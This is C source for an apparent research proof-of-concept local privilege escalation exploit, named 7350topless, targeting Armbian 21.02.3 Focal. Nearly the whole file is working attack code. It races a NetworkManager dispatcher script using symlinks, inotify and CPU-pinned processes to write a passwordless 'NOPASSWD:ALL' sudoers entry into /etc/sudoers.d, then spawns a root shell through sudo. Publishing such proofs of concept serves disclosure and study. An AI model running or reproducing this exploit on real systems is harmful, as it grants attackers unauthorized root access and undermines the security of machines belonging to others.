/*
 * This file is part of the 7350topless research PoC
 *
 * (C) 2021 by c-skills, Sebastian Krahmer,
 *             sebastian [dot] krahmer [at] gmail [dot] com
 *
 * 7350topless is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * 7350topless is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with 7350topless.  If not, see <http://www.gnu.org/licenses/>.
 */

/* armbian LPE for Armbian 21.02.3 Focal (80-update-htop-and-offload-tx)
 */
#define _GNU_SOURCE
#define _POSIX_C_SOURCE >= 200112L
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <pthread.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/inotify.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <pwd.h>


void die(const char *msg)
{
	perror(msg);
	exit(errno);
}


int cpus()
{
	char buf[8192] = {0};
	int fd = open("/proc/cpuinfo", O_RDONLY);
	if (fd < 0)
		return 4;
	if (read(fd, buf, sizeof(buf) - 1) < 0) {
		close(fd);
		return 4;
	}
	close(fd);
	fd = 0;
	char *str = buf;
	while ((str = strstr(str, "processor"))) {
		++fd;
		++str;
	}

	if (fd < 1)
		fd = 4;

	return fd;
}

extern char **environ;

int main(int argc, char **argv)
{
	const char *tgt_dir = "/etc/sudoers.d";
	const char *chk[] = {"/etc/NetworkManager/dispatcher.d/80-update-htop-and-offload-tx", "/etc/sudoers.d/htoprc"};
	char *sudo_fmt = "%s ALL=(ALL) NOPASSWD:ALL\n#";
	char sudo[256] = {0};
	char *env[] = {sudo, NULL};
	struct stat st;

	printf("\n[*] 7350topless Armbian PoC https://github.com/stealth/7350topless\n\n");

	int ncpus = cpus();

	printf("[+] Found %d cores\n", ncpus);

	struct passwd *pwd = getpwuid(getuid());

	if (!pwd)
		die("[-] Cannot find my own uid");

	printf("[*] Checking for vuln script ...\n");
	if (stat(chk[0], &st) != 0)
		die("[-] Not found");
	printf("[+] success\n[*] Setting up directory tree ...\n");

	signal(SIGCHLD, SIG_IGN);

	if (chdir(pwd->pw_dir) < 0)
		die("[-] chdir");

	snprintf(sudo, sizeof(sudo), sudo_fmt, pwd->pw_name);

	if (mkdir(".config", 0755) < 0 && errno != EEXIST)
		die("[-] mkdir");
	if (system("rm -rf .config/htop; rm -rf .config/xtop; rm -rf .config/h; rm -rf .config/h2; rm -rf .config/h3") < 0)
		;
	if (mkdir(".config/xtop", 0755) < 0 && errno != EEXIST)
		die("[-] mkdir");
	if (chdir(".config") < 0)
		die("[-] chdir");
	if (symlink(tgt_dir, "h2") < 0)
		die("[-] symlink");
	if (symlink("h2", "h") < 0)
		die("[-] symlink");
	if (symlink("xtop", "htop") < 0)
		die("[-] symlink");

	umask(0);

	printf("[+] success.\n[*] execing suid helper ...\n");

	pid_t pid = 0;
	if ((pid = fork()) == 0) {
		close(0); open("/dev/null", O_RDWR); dup2(0, 1); dup2(1, 2);
		char *suid[] = {"/usr/bin/ping", "127.0.0.1", NULL};
		execve(*suid, suid, env);
		exit(1);
	}
	sleep(3);
	kill(pid, SIGSTOP);

	printf("[*] setting up environ link ...\n");

	char proc[256] = {0};
	snprintf(proc, sizeof(proc), "/proc/%d/environ", pid);
	if (symlink(proc, "xtop/htoprc") < 0)
		die("[-] symlink");

	if (nice(-20) < 0)
		;

	printf("[+] sucess\n[*] creating and binding threads to cores ...\n");

	int shell = 0;
	cpu_set_t cpuset;
	CPU_ZERO(&cpuset);
	CPU_SET(0, &cpuset);

	for (int i = 1; i < ncpus; ++i) {
		if (fork() == 0) {
			CPU_ZERO(&cpuset);
			CPU_SET(i, &cpuset);
			break;
		}
		if (i + 1 == ncpus)
			shell = 1;
	}

	if (pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset) != 0)
		printf("[!] setaffinity() returned error, continuing anyway.\n");

	if (shell)
		printf("[+] success\n[*] creating inotify watch ...\n");

	char buf[4096] = {0};
	int fd = inotify_init();
	if (inotify_add_watch(fd, "htop", IN_OPEN) < 0)
		die("[-] inotify_add_watch");

	if (shell)
		printf("[+] success\n[*] Waiting for DHCP lease rebind (pull re/insert plug to accelerate) ...\n");

	for (int i = 0;;) {
		if (read(fd, buf, sizeof(buf)) <= 0)
			continue;
		if (i++ == 1) {
			syscall(SYS_rename, "h", "htop");
			break;
		}
	}

	while (stat(chk[1], &st) != 0)
		;
	syscall(SYS_rename, "htop", "h3");

	if (!shell)
		exit(0);

	printf("[+] success! Invoking shell ...\n");

	char *su[]={"/usr/bin/sudo", "bash", NULL};
	if (chdir("/") < 0)
		;
	execve(*su, su, environ);

	return 0;
}

